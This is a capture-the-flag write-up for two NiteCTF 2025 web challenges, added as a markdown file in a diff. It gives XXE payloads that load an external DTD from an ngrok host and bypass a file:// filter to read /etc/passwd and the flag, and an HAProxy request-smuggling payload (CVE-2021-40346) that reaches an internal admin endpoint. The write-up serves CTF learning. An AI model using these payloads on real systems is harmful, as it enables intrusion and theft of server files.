@@ -1,0 +1,331 @@
+---
+title: 'NiteCTF 2025 Writeup'
+date: '2025-12-14'
+description: 'Writeup for NiteCTF 2025 challenges "Graph Grief" and "Double Trouble".'
+tags: ['Writeup', 'CTF', 'NiteCTF 2025', 'GraphQL', 'XXE', 'HTTP Request Smuggling']
+featured: true
+---
+
+# Graph Grief
+
+## Challenge Introduction
+
+This challenge is titled "Graph Grief," worth 500 points, and had 0 solves at the time I attempted it. The challenge URL is `https://grief.chals.nitectf25.live/`, and it came with a crucial hint: **"Legacy XML importer may trigger internal file utilities"**.
+
+Upon accessing the website, I saw it was a landing page for "AetherCorp," advertising their GraphQL API services. The first thing I noticed was the `x-powered-by: Express` header, indicating the backend runs on Node.js.
+
+## Exploring the GraphQL Endpoint
+
+I tried accessing `/graphql` and discovered it is an Apollo Server. I attempted an introspection query, but it was blocked:
+
+```json
+{"errors":[{"message":"GraphQL introspection is not allowed by Apollo Server..."}]}
+```
+
+Without introspection, I had to find another way to discover the schema. I tried sending invalid queries to see if the error messages offered any clues:
+
+```bash
+curl -s https://grief.chals.nitectf25.live/graphql -H "Content-Type: application/json" \
+  -d '{"query":"{ test }"}'
+```
+
+The result was: `Cannot query field "test" on type "Query"`. However, when I tried `{ usrs }`, I received `Did you mean "users"?`. Interesting—the error message suggests field names!
+
+I leveraged this to map out the available fields: `users`, `profiles`, `orders`, `products`, and `node(id: ID!)`.
+
+## Discovering the Secret Type
+
+When querying `users`, I noticed a `role` field, and some users had the "admin" role. I also found that all IDs were base64 encoded; for example, `VXNlcjp1c2VyLTE=` decodes to `User:user-1`. This follows the Relay-style global ID standard.
+
+I started testing different IDs with the `node` query. After some trial and error, I discovered that when querying a non-existent ID, the server returned an error message suggesting the type name. From this, I found a type called `secret`:
+
+```bash
+curl -s https://grief.chals.nitectf25.live/graphql -H "Content-Type: application/json" \
+  -d '{"query":"{ node(id: \"c2VjcmV0OmZsYWc=\") { ... on secret { id flag } } }"}'
+```
+
+Result:
+
+```json
+{"data":{"node":{"id":"secret:flag","flag":null}}}
+```
+
+A `secret:flag` node exists and has a `flag` field, but the value is **null**! This is the goal of the challenge—figuring out how to get the actual flag value.
+
+## Exploring XML Processing
+
+Recalling the hint "Legacy XML importer may trigger internal file utilities," I tried sending a request with the Content-Type set to XML:
+
+```bash
+curl -s https://grief.chals.nitectf25.live/graphql -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><root>hello</root>'
+```
+
+Result: `hello`
+
+Interesting! The server parses XML and echoes the text content. I immediately thought of XXE (XML External Entity) injection.
+
+## Basic XXE Attempt - Blocked
+
+I tried the simplest XXE payload:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+Result: `"General SYSTEM entities are not allowed"`
+
+Hmm, SYSTEM entities are blocked. I tried using a parameter entity:
+
+```xml
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+%xxe;
+]>
+```
+
+Result: `"Local or non-http(s) SYSTEM entities are not allowed"`
+
+The server only allows HTTP/HTTPS in SYSTEM entities. I tried pointing to localhost:
+
+```xml
+<!ENTITY % xxe SYSTEM "http://127.0.0.1/test">
+```
+
+Result: `"Localhost access via SYSTEM entity is not allowed"`
+
+Localhost is also blocked. However, when I tried with an external HTTPS URL:
+
+```xml
+<!DOCTYPE foo [
+<!ENTITY % remote SYSTEM "https://webhook.site/xxx">
+%remote;
+]>
+```
+
+Result: `{"error":"XML parse failed","message":"Start tag expected, '<' not found\n"}`
+
+A different error! This means the server **actually fetched the URL** and tried to parse the response as a DTD, but failed because webhook.site returned HTML, not a valid DTD.
+
+## Setting up a DTD Server with Ngrok
+
+I needed to host a DTD file for the server to fetch. I quickly set up an HTTP server:
+
+```bash
+mkdir -p /tmp/grief_ctf/dtd_server
+cd /tmp/grief_ctf/dtd_server
+python3 -m http.server 8888 &
+ngrok http 8888
+```
+
+Ngrok gave me a public URL: `https://fc0e085cc835.ngrok-free.app`
+
+I created a simple test DTD:
+
+```xml
+<!ENTITY greeting "Hello from external DTD">
+```
+
+And sent the request:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % remote SYSTEM "https://fc0e085cc835.ngrok-free.app/simple.dtd">
+%remote;
+]>
+<root>&greeting;</root>
+```
+
+Result: `Hello from external DTD`
+
+**Great!** External DTD fetching works, and entities defined in the external DTD can be utilized!
+
+## Testing `file://` in External DTD - Filtered
+
+I tried defining a SYSTEM entity with `file://` inside the external DTD:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY exfil '%file;'>">
+%eval;
+```
+
+Result: `"Remote DTD contains blocked schemes"`
+
+Oh, the server also checks the content of the external DTD! It scans for and blocks schemes like `file://`.
+
+## Bypassing the Filter
+
+I tried several bypass techniques:
+
+- `FILE://` (uppercase) → Blocked
+- URL encoding `%66%69%6c%65%3a%2f%2f` → Passed the filter but failed to resolve.
+
+Then I thought: **what if I don't use a scheme at all?** I tried using an absolute path:
+
+```xml
+<!ENTITY content SYSTEM "/etc/passwd">
+```
+
+I sent the request and... **BOOM!**
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+node:x:1000:1000::/home/node:/bin/bash
+ctf:x:1001:1001::/home/ctf:/bin/sh
+```
+
+**IT WORKED!** The filter only checks for the `file://` scheme but doesn't validate absolute paths like `/etc/passwd`.
+
+## Finding the Flag
+
+I knew I could read files, so now I had to locate the flag. I tried a few common locations:
+
+- `/flag.txt` → Entity not defined (file does not exist)
+- `/flag` → Entity not defined
+- `/home/ctf/flag.txt` → Entity not defined
+
+I read `/etc/hostname` to better understand the environment:
+
+```
+grief-9df696fb8-l9hj8
+```
+
+Ah, it's a Kubernetes pod! For Node.js apps in Docker/K8s, source code is typically located in `/app`. I tried:
+
+```xml
+<!ENTITY content SYSTEM "/app/flag.txt">
+```
+
+And sent the request:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % remote SYSTEM "https://fc0e085cc835.ngrok-free.app/docker_1.dtd">
+%remote;
+]>
+<root>&content;</root>
+```
+
+Result:
+
+```
+nite{Th3_Qu4ntum_Ent1ty_H4s_B33n_Summ0n3d}
+```
+
+**FLAG: `nite{Th3_Qu4ntum_Ent1ty_H4s_B33n_Summ0n3d}`**
+
+## Summary
+
+The vulnerability here is **XXE with external DTD bypass**. The server has multiple protection layers:
+
+1.  Blocks SYSTEM entities in the main XML document.
+2.  Only allows HTTP/HTTPS schemes.
+3.  Blocks localhost access.
+4.  Checks external DTD content to block schemes like `file://`.
+
+However, the developer forgot that in Unix systems, you can reference a file using an absolute path without a scheme. `/etc/passwd` and `file:///etc/passwd` point to the same file!
+
+The filter checked for the string `file://` but missed the `/etc/...` pattern or absolute paths in general. By defining a general SYSTEM entity with an absolute path inside the external DTD, I bypassed all filters and retrieved the flag.
+
+***
+
+# Double Trouble
+
+## Challenge Introduction
+
+This was another gnarly challenge, worth 500 points with 0 solves when I tackled it. The author provided a partial source code and a URL: [http://doubletrouble.koreacentral.cloudapp.azure.com:1337/](http://doubletrouble.koreacentral.cloudapp.azure.com:1337/)
+
+[handout.zip](NiteCTF%202025%20Writeup/handout.zip)
+
+## Checking Source Code
+
+Although only a part of the source code was provided, it was enough to visualize the logic of the challenge.
+
+I looked at `app.py`. usually, I start by finding where the flag is hidden and working backward from there. In this challenge, I saw the `FLAG` variable declared but never used:
+
+```python
+FLAG = os.environ.get('FLAG', 'nite{REDACTED}')
+```
+
+However, I discovered an `/admin` endpoint and surmised that I needed to access this endpoint to get the flag.
+
+I also noticed the `is_admin_ip(ip)` function. This function acts to strip input, take the first part, and check if it contains "10.", "127.", "172.16.", or "192.168." (checking if the IP is local).
+
+Additionally, there is the `/con` endpoint. It checks the request's `Content-Length` and tags the session as `poisoned: True` if `Content-Length > 0`.
+
+```python
+@app.route('/con', methods=['GET', 'POST'])
+def reserved_names():
+    user_id = get_user_id()
+    token = create_session_token(user_id)
+
+    content_length = request.headers.get('Content-Length')
+    if content_length:
+        if int(content_length) > 0:
+            player_sessions[user_id][token]['poisoned'] = True
+
+    if content_length:
+        if int(content_length) > 0:
+            response.set_cookie('session_token', token, **cookie_kwargs)
+```
+
+I continued reading `httpd.conf` and saw some interesting things:
+
+```apache
+RequestHeader set X-Apache-Layer "reverse-proxy"
+RequestHeader set X-Backend-Route "layer3"
+RequestHeader set X-Offset
+```
+
+The `X-Offset` header is created but has no value assigned, which is another suspicious detail.
+
+After checking the debug endpoint, I discovered more headers:
+
+```
+X-Haproxy-Version: 2.0.14
+X-Proxy-Instance: frontend-01
+```
+
+Excellent. Thanks to these headers, I searched and discovered **CVE-2021-40346**.
+
+So, I had everything I needed.
+
+First, I could use HTTP Request Smuggling to create a poisoned `user_id` and `session_id`.
+
+Then, I would use the CVE mentioned above to read the flag.
+
+```http
+POST /con HTTP/1.1
+Host: doubletrouble.koreacentral.cloudapp.azure.com:1337
+Content-Length: 5
+Connection: keep-alive
+
+AAAAA
+```
+
+```http
+POST /api/v1/data HTTP/1.1
+Host: doubletrouble.koreacentral.cloudapp.azure.com:1337
+Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
+Content-Length: 199
+
+GET /admin HTTP/1.1
+Host: 127.0.0.1:8000
+Cookie: user_id=322e5ad4-4f2e-455e-9a51-94a68d9d32c5; session_token=76364f77-6e37-4a13-966d-20f38eca6f2b
+X-Offset: 118
+X-Forwarded-For: 127.0.0.1:8000
+```
+
+Cheers.
+
+> **Note:** Regarding `X-Offset`, according to a hint from the author on Discord, this represents the offset of the headers. You just need to calculate the length of those 4 strange headers (in bytes) to get the value.
